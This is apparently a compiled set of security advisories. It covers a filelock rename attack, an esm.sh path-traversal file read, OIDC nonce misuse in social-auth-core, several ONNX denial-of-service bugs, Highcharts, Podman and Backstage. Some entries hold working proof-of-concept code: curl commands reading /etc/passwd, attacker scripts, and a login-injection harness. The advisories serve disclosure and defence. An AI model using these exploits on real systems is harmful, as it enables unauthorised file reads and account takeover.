victim.stdin.close()
victim.wait()

# check: the victim's private journal must not be emptied, widened to 0666, or readable by the attacker
lock_after = os.stat(lock_path)
lock_content_after = open(lock_path).read()
attacker_read_after = as_attacker("attacker_read_file.py", lock_path)
print(
    f"OBSERVED lock path: inode {lock_after.st_ino}, uid {lock_after.st_uid}, "
    f"mode {stat.S_IMODE(lock_after.st_mode):o}, content {lock_content_after!r}"
)
print(f"OBSERVED attacker reads the lock path: {attacker_read_after!r}")

attacker_was_denied = attacker_read_before == "permission denied\n"
lock_path_is_the_journal = (lock_after.st_dev, lock_after.st_ino) == (journal_before.st_dev, journal_before.st_ino)
journal_was_emptied = "job 1" in journal_content_before and "job 1" not in lock_content_after
journal_was_widened = stat.S_IMODE(journal_before.st_mode) == 0o600 and stat.S_IMODE(lock_after.st_mode) == 0o666
attacker_reads_the_secret = secret in attacker_read_after
bug = (
    attacker_was_denied
    and lock_path_is_the_journal
    and journal_was_emptied
    and journal_was_widened
    and attacker_reads_the_secret
)
print("BUG" if bug else "OK")
```

**`repro.d/attacker_read_file.py`**

```python
import sys

try:
    print(open(sys.argv[1]).read(), end="")
except PermissionError:
    print("permission denied")
```

**`repro.d/attacker_rename_journal.py`**

```python
import os
import sys

shared_directory = sys.argv[1]

# needs only write access to the directory: no sticky bit, so any user may rename any entry in it
os.rename(f"{shared_directory}/victim-journal.log", f"{shared_directory}/jobs.lock")
```

**`repro.d/victim_job_runner.py`**

```python
import os
import sys

from filelock import FileLock

shared_directory = sys.argv[1]

journal_fd = os.open(f"{shared_directory}/victim-journal.log", os.O_WRONLY | os.O_CREAT | os.O_APPEND, 0o600)
# UnixFileLock opens the lock file O_RDWR, so a lock that other users of the directory also take needs mode=0o666
lock = FileLock(f"{shared_directory}/jobs.lock", mode=0o666, timeout=5)

for job in sys.stdin:
    with lock:
        os.write(journal_fd, f"ran {job}".encode())
    print("done", flush=True)
```

## Attack sequence

```mermaid
sequenceDiagram
    participant A as other account
    participant D as shared directory (writable, not sticky)
    participant V as lock user: FileLock("jobs.lock", mode=0o666)
    participant K as kernel
    Note over V,D: victim-journal.log, owner victim, mode 0600 (the other account cannot read it)
    A->>D: mv victim-journal.log jobs.lock (one rename, no race)
    V->>K: open(jobs.lock, O_RDWR|O_NOFOLLOW|O_CREAT|O_EXCL) -> EEXIST
    V->>K: open(jobs.lock, O_RDWR|O_NOFOLLOW) -> fd (regular file, created=False)
    V->>K: flock(fd, LOCK_EX|LOCK_NB) -> ok (no holder)
    rect rgb(255, 214, 214)
        V->>K: fstat(fd), st_nlink != 0
        V->>K: ftruncate(fd, 0)
        V->>K: fchmod(fd, 0o666)
        Note over V,K: the journal's inode is now empty and world read-write, still owned by victim
    end
    V->>K: write("ran job 2 <secret>") through the journal descriptor it still holds
    A->>D: read jobs.lock -> "ran job 2 <secret>"
```

## Evidence

The scanner reproducer (`victim` and `attacker` accounts, root-created `0777` directory without the sticky bit under `/tmp`, default sysctls, Linux 6.1, CPython 3.14.8, overlayfs; lock `FileLock(path, mode=0o666, timeout=5)`). It printed `CONTROL journal: inode 296383, uid 1000, mode 600, content 'ran job 1\n'` and `CONTROL attacker reads the journal: 'permission denied\n'`. After the rename and the second job of `victim` it printed `OBSERVED lock path: inode 296383, uid 1000, mode 666, content 'ran job 2 f4bc9a4e04c3f556\n'` and `OBSERVED attacker reads the lock path: 'ran job 2 f4bc9a4e04c3f556\n'`, last line `BUG`. The verdict requires that the earlier read by `attacker` failed, that the lock path is the journal's inode, that the old line is gone, that the mode went from `0600` to `0666`, and that the later read by `attacker` contains the secret. It runs in under a second with no race. The scanner ran the two-name and `link(2)` variants above by hand at the same commit (commands and results in its report), not through the script.

Maintainer triage: the reproducer prints `BUG` on the scanned commit `b831496` and on the 4.2.0 release image. The independent review (`soft-open`) confirmed the mechanism and that the hard-link and two-name variants go through the same two calls.

## Impact

The file's content is lost in every configuration, including for processes that hold the file open and under every other name the file has. With an explicit permissive `mode`, the other user can read and modify everything the lock user writes afterwards, while the file still belongs to the lock user. The other user can rename the file back to its old name after the acquire. It stays there with the lock's mode, and the lock user's next acquire creates a fresh lock file.

Somebody who may rename a single-name file may also unlink it, so losing such a file under its name is not new. What the lock adds are two operations on the inode that the other user cannot perform, `ftruncate` and `fchmod`, run with the lock user's privileges. Those matter for a descriptor the lock user still holds, for a second name of the file, and for programs that trust the file's ownership. The other user does not choose the mode, and the lock user writes no bytes the other user chose. Mutual exclusion is not affected.

## Workarounds

- Keep the lock file in a directory no other account can write, or in a sticky directory on a filesystem where no directory holding the lock user's files is writable by others. On Linux keep `fs.protected_hardlinks=1` (the default on mainstream distributions), which closes the hard-link route.
- Do not pass a permissive explicit `mode` (`0o666`, `0o660`, `0o644`) unless accounts share the lock; without a mode the exposure is the truncation only.
- Keep the lock file in place (`preserve_lock_file=True`). Once a lock file owned by the lock user exists in a sticky directory, another user cannot rename or link over it.
- Where the lock does not need `flock` semantics, `SoftFileLock` applies its mode only to the marker it created with `O_EXCL` and does not truncate an existing file.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/835

items.summary: Highcharts JS is a JavaScript charting library based on SVG. From 12.0.0 until 12.6.1 and 13.1.0, Highcharts falls back to assigning raw markup to innerHTML when DOMParser cannot return a document, before its allow-list is applied. In Chromium, the Trusted Types callback can throw while a beforeprint handler runs, so a page that redraws a chart during beforeprint can insert untrusted HTML text options into the hosting document. Event handlers in that markup then run in the page origin when printing begins. The issue affects HTML-rendered titles, labels, data labels, responsive text, and the Stock, Maps, and Gantt products shipped in the same package. This issue is fixed in 12.6.1 and 13.1.0.

items.summary: ## Summary A Local File Inclusion (LFI) issue was identified in the esm.sh service URL handling. An attacker could craft a request that causes the server to read and return files from the host filesystem (or other unintended file sources). **Severity:** High — LFI can expose secrets, configuration files, credentials, or enable further compromise. **Impact:** reading configuration files, private keys, environment files, or other sensitive files; disclosure of secrets or credentials; information leakage that could enable further attacks. Vulnerable code snippet is in this file: https://github.com/esm-dev/esm.sh/blob/c62f191d32639314ff0525d1c3c0e19ea2b16143/server/router.go#L1168 --- ## Proof of Concept 1. Using this default config file that I copy from the repo, the server is running at `http://localhost:9999` with this command `go run server/esmd/main.go --config=config.json` ```json { "port": 9999, "npmRegistry": "https://registry.npmjs.org/", "npmToken": "******" } ``` 2. Trigger the LFI vulnerability by sending this command below to read a local file ```bash # read /etc/passwd curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&module=1' # or read the database esm.db file curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../esm.db?raw=1&module=1' ``` --- ## Remediation Simply remove any `..` in the URL path before actually process the file. See more details in [this guide](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html) ## Credits - [Ai Ho (Jessie)](https://github.com/j3ssie) - [CL Yang](https://github.com/A11riseforme)

items.summary: A flaw was found in Podman. This issue may allow an attacker to create a specially crafted container that, when configured to share the same IPC with at least one other container, can create a large number of IPC resources in /dev/shm. The malicious container will continue to exhaust resources until it is out-of-memory (OOM) killed. While the malicious container's cgroup will be removed, the IPC resources it created are not. Those resources are tied to the IPC namespace that will not be removed until all containers using it are stopped, and one non-malicious container is holding the namespace open. The malicious container is restarted, either automatically or by attacker control, repeating the process and increasing the amount of memory consumed. With a container configured to restart always, such as `podman run --restart=always`, this can result in a memory-based denial of service of the system.

items.summary:
## Summary

ONNX's Python tensor-materialization helpers could allocate memory according to attacker-controlled tensor dimensions without verifying that a packed sub-byte payload contained the declared number of elements.

A very small model could therefore cause a disproportionately large allocation when an application called `onnx.numpy_helper.to_array()` or constructed `onnx.reference.ReferenceEvaluator` with the model. The issue affected `UINT2`, `INT2`, `UINT4`, `INT4`, and `FLOAT4E2M1` tensors stored in either `raw_data` or packed `int32_data`.

## Technical details

The vulnerable `_unpack_2bit()` and `_unpack_4bit()` paths first allocated a small array based on the available packed bytes, then resized it to the shape declared in `TensorProto.dims`. They did not first confirm that the payload encoded enough logical elements for that shape.

For example, the reporter demonstrated a 66-byte model containing one packed byte and a declared dimension of 700,000,000. The model passed `onnx.checker.check_model()` and allocated approximately 700 MB while materializing the initializer, followed by another large allocation when executing the reference evaluator.

Loading, checking, or running shape inference on the serialized model alone did not trigger the allocation. The vulnerable tensor had to be materialized.

## Impact

An application that materializes packed tensors from an untrusted model can exhaust available memory, causing denial of service. Memory corruption and code execution were not demonstrated.

## Affected versions

- Affected: ONNX through 1.21.0
- Patched: ONNX 1.22.0

## Remediation

Upgrade to ONNX 1.22.0 or later.

The primary fix validates the logical element count before resizing the unpacked NumPy array. A complementary checker change rejects an undersized packed payload before materialization.

- Materialization fix: [onnx/onnx#8033](https://github.com/onnx/onnx/pull/8033)
- Checker defense-in-depth: [onnx/onnx#8038](https://github.com/onnx/onnx/pull/8038)

The five affected tensor types and both storage formats were re-tested against the published ONNX 1.23.2 wheel and are rejected before the oversized allocation.

To verify the behavior using a released vulnerable package in an isolated environment, install `onnx==1.21.0` with `python -m pip install "onnx==1.21.0"`. Run memory-exhaustion demonstrations only with an appropriate process memory limit.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.

items.summary:
## Summary

ONNX shape inference did not safely validate the required Scan `num_scan_inputs` attribute. Two malformed values could terminate or disrupt the process:

1. If the attribute was missing, `ctx.getAttribute("num_scan_inputs")` returned null and was dereferenced.
2. If the attribute was negative, conversion to `size_t` produced a very large value that reached a vector allocation and raised `std::length_error`.

The negative-value variant passed `onnx.checker.check_model()` before reaching shape inference.

## Technical details

The vulnerable Scan inference implementations used the following pattern:

```cpp
auto num_scan_inputs =
    narrow_cast<size_t>(ctx.getAttribute("num_scan_inputs")->i());
```

This code neither checked the returned pointer nor rejected a negative signed value before converting it to an unsigned size. The pattern was present in the current Scan inference function and the older opset 8 and 9 paths.

The fix uses the required-attribute helper and checked narrowing:

```cpp
auto num_scan_inputs =
    narrow<size_t>(getRequiredAttributeInt(ctx, "num_scan_inputs"));
```

## Impact

An application that performs shape inference on an untrusted model can be terminated or forced into an exceptional allocation path, causing denial of service. No confidentiality or integrity impact was demonstrated.

## Affected versions

- Affected: ONNX 1.4.0 through 1.21.0
- Patched: ONNX 1.22.0

ONNX 1.4.0 is the first release containing the vulnerable Scan shape-inference implementation.

## Remediation

Upgrade to ONNX 1.22.0 or later.

- Fix: [onnx/onnx#7916](https://github.com/onnx/onnx/pull/7916)
- Commit: [`dd6bc92ea`](https://github.com/onnx/onnx/commit/dd6bc92ea39fd2274fd671f0734b0b8b558356f5)

Both reported models were re-tested against the published ONNX 1.23.2 wheel and correctly raise `InferenceError`.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.

The two triggers remain in one advisory because they affect the same required attribute, share the same unsafe conversion path and remediation, and were fixed in the same release.

items.summary:
## Summary

ONNX ConvTranspose shape inference performed an out-of-bounds read when the weight tensor had fewer than three dimensions and the model did not provide a `kernel_shape` attribute.

The inference function derived an empty `effective_kernel_shape` vector from the undersized weight tensor, then indexed that vector once for each spatial dimension of the input tensor. A crafted model passed `onnx.checker.check_model()` and caused SIGSEGV when passed to `onnx.shape_inference.infer_shapes()`.

## Technical details

For an input shape such as `[1, 1, 5]`, shape inference computes one spatial input dimension. A weight shape such as `[1, 3]` has no spatial dimensions, so deriving `kernel_shape` from dimensions 2 onward produces an empty vector. The output loop nevertheless accesses `effective_kernel_shape[0]`.

The defect affected both the older `convTransposeShapeInference_opset11()` path and the then-current ConvTranspose inference implementation.

## Impact

An application that performs shape inference on an untrusted model can be terminated, causing denial of service. The observed result was a deterministic process crash. No confidentiality or integrity impact was demonstrated.

## Affected versions

- Affected: ONNX 1.2.1 through 1.21.0
- Patched: ONNX 1.22.0

## Remediation

Upgrade to ONNX 1.22.0 or later. The fix rejects input and weight tensors with fewer than three dimensions before deriving the spatial kernel shape.

- Fix: [onnx/onnx#7997](https://github.com/onnx/onnx/pull/7997)
- Commit: [`2ec288908`](https://github.com/onnx/onnx/commit/2ec288908952eea9dcf48d4b197915e1f72c6abf)

The original malformed model was re-tested against the published ONNX 1.23.2 wheel and correctly raises `InferenceError`.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.

## Summary

ONNX shape inference performed an out-of-bounds read when processing a malformed RNN, GRU, or LSTM node from opsets 1–6 whose first input had a rank other than three.

`RNNShapeInference_opset1_to_6()` checked whether the input shape was present but accessed `dim(0)` and `dim(1)` without first checking its rank. A crafted model could therefore terminate a process that called `onnx.shape_inference.infer_shapes()`. The model passed `onnx.checker.check_model()` before reaching the vulnerable path.

## Technical details

The vulnerable code read dimensions unconditionally:

```cpp
if (hasInputShape(ctx, 0)) {
  const auto& first_input_shape = getInputShape(ctx, 0);
  seq_length = first_input_shape.dim(0);
  batch_size = first_input_shape.dim(1);
}
```

For an undersized shape, protobuf's repeated-field access read outside the intended array in release builds. The observed result was SIGSEGV; sanitizer and debug builds terminated on a protobuf bounds check.

The newer opset 7–13 and opset 14+ inference paths already required the first input to have rank three and were not affected.

## Impact

An application that performs shape inference on an untrusted model can be terminated, causing denial of service. Exploitation does not require privileges or human interaction once the model is processed. No confidentiality or integrity impact was demonstrated.

## Affected versions

- Affected: ONNX through 1.21.0
- Patched: ONNX 1.22.0

The vulnerable schemas are limited to RNN and LSTM opsets 1–6 and GRU opsets 3–6.

## Remediation

Upgrade to ONNX 1.22.0 or later. The fix validates that the first input has rank three before accessing its dimensions.

- Fix: [onnx/onnx#7879](https://github.com/onnx/onnx/pull/7879)
- Commit: [`92e541266`](https://github.com/onnx/onnx/commit/92e541266af5dd38cfa48aeb92206f4268a066cd)

The original malformed model was also re-tested against the published ONNX 1.23.2 wheel and correctly raises `InferenceError`.

## Severity

The vulnerable ONNX component processes the malicious model through a local library API or file boundary and is not itself bound to a network stack. Applications that expose ONNX model processing over a network should calculate an Environmental score with Modified Attack Vector set to Network.

Prior to 0.32.0, the Phi-4 multimodal audio encoder in phi4mm_audio.py and phi4mm_utils.py uses eager attention by default, allowing a remote client to submit one legal long audio clip that causes MultiHeadedAttention.forward_attention to materialize and retain full attention matrices in self.attn. items.summary:
### Summary

The generic OpenID Connect backend (`OpenIdConnectAuth` and every backend built on it) stores the `nonce` in the shared Association table, not in the user's session. When the ID token comes back, `validate_claims` only checks that the nonce exists in that table and is not expired. It does not check that the nonce was issued to the browser that is finishing the login.

So the nonce does not do its job. OIDC Core (section 15.5.2) and RFC 9700 (section 4.5) use the nonce to stop authorization code injection: an attacker who gets hold of a victim's unused authorization code should not be able to redeem it in the attacker's own browser. With social-auth-core, the attacker can. They start their own login to get a valid `state` for their session, then hit the callback with the victim's `code` and their own `state`. `state` passes because it belongs to the attacker's session, and the nonce in the victim's ID token passes because it is in the global table. The attacker's browser is now logged in as the victim.

PKCE would block this, but `OpenIdConnectAuth` sets `DEFAULT_USE_PKCE = False` (the OAuth2 base class defaults to `True`), so the nonce is the only binding in the default setup.

### Tested versions

social-auth-core 6.1.1 (latest), 6.1.0 and 5.2.0, with social-auth-app-django 7.1.0 and Django 6.1.2, Python 3.14. The same code is on master (098ef399c1).

### Details

`social_core/backends/open_id_connect.py` in 6.1.1:

- line 252: `auth_params` calls `get_and_store_nonce(self.authorization_url(), state)`
- lines 333 to 346: `get_and_store_nonce` stores the nonce as an `OpenIdConnectAssociation` keyed by `server_url` and `handle=nonce`. The state goes into `assoc_type` but is never read back.
- lines 348 to 358: `get_nonce` looks the nonce up by `server_url` and `handle` only
- lines 393 to 415: `validate_claims` accepts any stored, unexpired nonce and removes it
- line 110: `DEFAULT_USE_PKCE = False`

### PoC

Everything runs locally. `mockidp.py` is a small OpenID provider on 127.0.0.1 that checks `redirect_uri` and enforces PKCE when a `code_challenge` was sent, like a normal provider. `social_nonce.py` uses two Django test clients as two browsers.

```
pip install social-auth-core social-auth-app-django django pyjwt cryptography
python social_nonce.py
```

Output on 6.1.1:

```
[inject] attacker session completes with victim code: (200, 'user=victim')
```

Controls:

```
MODE=control_victim python social_nonce.py
[control] victim completes normally: (200, 'user=victim')

MODE=control_unknown_nonce python social_nonce.py
[control] unknown nonce: ('EXC', 'AuthResponseError: The authentication response could not be matched to the request.')

PKCE=1 python social_nonce.py
[inject] attacker session completes with victim code: ('EXC', 'AuthCredentialError: The authorization code was rejected. Please restart login.')
```

So the nonce check runs, but it accepts a nonce that belongs to another browser. With PKCE on, the same attack fails.

mockidp.py:

```python
"""Minimal local OpenID Provider on 127.0.0.1 for testing RP libraries."""
import json, time, secrets, threading, hashlib, base64, urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

class IdP:
    def __init__(self, port=0, client_id="rp-client", client_secret="rp-secret", name="idp"):
        self.key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        self.kid = name + "-k1"
        self.client_id, self.client_secret = client_id, client_secret
        self.codes = {}
        self.access = {}
        self.claims_override = {}
        self.srv = ThreadingHTTPServer(("127.0.0.1", port), self._handler())
        self.port = self.srv.server_address[1]
        self.issuer = f"http://127.0.0.1:{self.port}"
        threading.Thread(target=self.srv.serve_forever, daemon=True).start()

    def jwk(self):
        n = self.key.public_key().public_numbers()
        tb = lambda i: i.to_bytes((i.bit_length() + 7) // 8, "big")
        return {"kty": "RSA", "kid": self.kid, "use": "sig", "alg": "RS256", "n": b64u(tb(n.n)), "e": b64u(tb(n.e))}

    def discovery(self):
        i = self.issuer
        return {"issuer": i, "authorization_endpoint": i + "/authorize", "token_endpoint": i + "/token",
                "userinfo_endpoint": i + "/userinfo", "jwks_uri": i + "/jwks",
                "response_types_supported": ["code"], "subject_types_supported": ["public"],
                "id_token_signing_alg_values_supported": ["RS256"],
                "token_endpoint_auth_methods_supported": ["client_secret_basic", "client_secret_post"],
                "code_challenge_methods_supported": ["S256"]}

    def user_authorizes(self, authorize_url, sub):
        """The end user `sub` approves an authorization request; returns (code, params)."""
        q = dict(urllib.parse.parse_qsl(urllib.parse.urlsplit(authorize_url).query))
        code = "code-" + secrets.token_hex(8)
        self.codes[code] = {"sub": sub, "nonce": q.get("nonce"), "redirect_uri": q.get("redirect_uri"),
                            "code_challenge": q.get("code_challenge")}
        return code, q

    def sign(self, claims):
        return jwt.encode(claims, self.key, algorithm="RS256", headers={"kid": self.kid})

    def _handler(idp):
        class H(BaseHTTPRequestHandler):
            def log_message(self, *a): pass
            def _json(self, obj, code=200):
                b = json.dumps(obj).encode()
                self.send_response(code); self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
            def do_GET(self):
                p = urllib.parse.urlsplit(self.path).path
                if p.endswith("/.well-known/openid-configuration"): return self._json(idp.discovery())
                if p == "/jwks": return self._json({"keys": [idp.jwk()]})
                if p == "/userinfo":
                    tok = (self.headers.get("Authorization") or "").split(" ")[-1]
                    sub = idp.access.get(tok)
                    if not sub: return self._json({"error": "invalid_token"}, 401)
                    return self._json({"sub": sub, "email": sub + "@example.test", "preferred_username": sub})
                return self._json({"error": "not_found"}, 404)
            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                body = dict(urllib.parse.parse_qsl(self.rfile.read(n).decode()))
                p = urllib.parse.urlsplit(self.path).path
                if p == "/token":
                    rec = idp.codes.pop(body.get("code"), None)
                    if not rec: return self._json({"error": "invalid_grant"}, 400)
                    if rec["redirect_uri"] and body.get("redirect_uri") != rec["redirect_uri"]:
                        return self._json({"error": "invalid_grant"}, 400)
                    if rec["code_challenge"]:
                        v = body.get("code_verifier") or ""
                        if b64u(hashlib.sha256(v.encode()).digest()) != rec["code_challenge"]:
                            return self._json({"error": "invalid_grant"}, 400)
                    at = "at-" + secrets.token_hex(8)
                    idp.access[at] = rec["sub"]
                    now = int(time.time())
                    claims = {"iss": idp.issuer, "sub": rec["sub"], "aud": idp.client_id, "iat": now, "exp": now + 300,
                              "at_hash": b64u(hashlib.sha256(at.encode()).digest()[:16])}
                    if rec["nonce"]: claims["nonce"] = rec["nonce"]
                    claims.update(idp.claims_override)
                    return self._json({"access_token": at, "token_type": "Bearer", "expires_in": 300,
                                       "id_token": idp.sign(claims)})
                return self._json({"error": "not_found"}, 404)
        return H
```

```python
import os, sys
sys.path.insert(0, os.path.dirname(__file__))
from mockidp import IdP
idp = IdP()
import django
from django.conf import settings
PKCE = os.environ.get("PKCE") == "1"
settings.configure(
    DEBUG=True, SECRET_KEY="x", ALLOWED_HOSTS=["*"], ROOT_URLCONF=__name__,
    INSTALLED_APPS=["django.contrib.auth", "django.contrib.contenttypes", "django.contrib.sessions", "social_django"],
    MIDDLEWARE=["django.contrib.sessions.middleware.SessionMiddleware", "django.contrib.auth.middleware.AuthenticationMiddleware"],
    DATABASES={"default": {"ENGINE": "django.db.backends.sqlite3", "NAME": ":memory:"}},
    AUTHENTICATION_BACKENDS=["social_core.backends.open_id_connect.OpenIdConnectAuth"],
    SOCIAL_AUTH_OIDC_OIDC_ENDPOINT=idp.issuer, SOCIAL_AUTH_OIDC_KEY=idp.client_id, SOCIAL_AUTH_OIDC_SECRET=idp.client_secret,
    SOCIAL_AUTH_OIDC_USE_PKCE=PKCE, SOCIAL_AUTH_LOGIN_REDIRECT_URL="/done/", SOCIAL_AUTH_RAISE_EXCEPTIONS=True,
)
django.setup()
from django.urls import include, path
from django.http import HttpResponse
urlpatterns = [path("", include("social_django.urls", namespace="social")),
               path("done/", lambda r: HttpResponse("user=%s" % r.user.username))]
from django.core.management import call_command
call_command("migrate", verbosity=0)
from django.test import Client

def begin(c):
    r = c.post("/login/oidc/"); assert r.status_code == 302, r.status_code
    return r["Location"]

def complete(c, code, state):
    try:
        r = c.get("/complete/oidc/", {"code": code, "state": state})
        if r.status_code == 302:
            r = c.get(r["Location"])
        return r.status_code, r.content.decode()
    except Exception as e:
        return "EXC", f"{type(e).__name__}: {e}"

victim, attacker = Client(), Client()
# Victim starts a login. The provider issues a code for "victim" tied to the victim's nonce.
v_url = begin(victim)
code_v, qv = idp.user_authorizes(v_url, "victim")
# Attacker starts a login in their own browser to get a valid state for their session.
a_url = begin(attacker)
_, qa = idp.user_authorizes(a_url, "attacker")
mode = os.environ.get("MODE", "inject")
if mode == "inject":
    print("[inject] attacker session completes with victim code:", complete(attacker, code_v, qa["state"]))
elif mode == "control_unknown_nonce":
    idp.claims_override = {"nonce": "never-issued-nonce"}
    print("[control] unknown nonce:", complete(attacker, code_v, qa["state"]))
elif mode == "control_victim":
    print("[control] victim completes normally:", complete(victim, code_v, qv["state"]))
```

### Impact

An attacker who gets a victim's authorization code before it is used can log in to the relying party as the victim. Codes leak in practice through the callback URL: Referer headers, proxy or server logs, browser history and sync, a malicious browser extension, or an open redirect on the callback. This is the exact case the OIDC nonce is meant to cover. The attacker does not need the client secret, because the relying party itself redeems the code.

It affects every app that uses `OpenIdConnectAuth` or a backend built on it with the default settings (PKCE off).

### Suggested fix

Bind the nonce to the session that started the login. For example, keep the nonce (or a hash of it) in the session next to `state` in `auth_params`, and in `validate_claims` compare the ID token nonce with the session value before removing it. Turning PKCE on by default for the OIDC backend would also close this, and matches the OAuth2 base class.

items.summary:
## Summary

`@backstage/plugin-catalog-backend` matches URL-type locations against `catalog.rules` location patterns using the raw URL string submitted by the user, while URL readers resolve that same string in canonical form when fetching the location's content. A URL can therefore be crafted so that it appears to belong to a trusted location scope during rule evaluation, but is fetched from a different scope.

## Details

When a deployment restricts catalog kinds to trusted URL prefixes using `catalog.rules` location patterns, `DefaultCatalogRulesEnforcer` applies glob matching directly to the raw `location.target` string. The URL readers used for ingestion resolve the same target in canonical form, including normalizing percent-encoded dot segments. A registered location such as `https://<host>/trusted/%2e%2e/attacker/repo/blob/main/catalog-info.yaml` matches a `https://<host>/trusted/**` pattern as a raw string, but resolves to and is fetched from `https://<host>/attacker/repo/...` when its content is read.

An authenticated user with permission to register catalog locations (`catalog.location.create`) can use this to have an entity from an untrusted source admitted as if it originated from a trusted location scope.

## Impact

The crossed boundary is the operator-configured catalog ingestion policy: entity content from outside the trusted location scope is ingested as if it were within it. Downstream consequences depend on deployment configuration, for example actions taken with integration credentials by processors or scaffolder when acting on the ingested entity. The assessment of this report found no basis for impact claims beyond the ingestion policy boundary itself.

## Patches

This is fixed in `@backstage/plugin-catalog-backend` 3.9.2 (Backstage release 1.54.10) and 4.0.2 (Backstage release 1.56.1). Version 4.0.1 as published is not fixed.

## Workarounds

No complete workaround is available for deployments that rely on URL location patterns to restrict catalog kinds. Restricting location registration permissions reduces exposure.
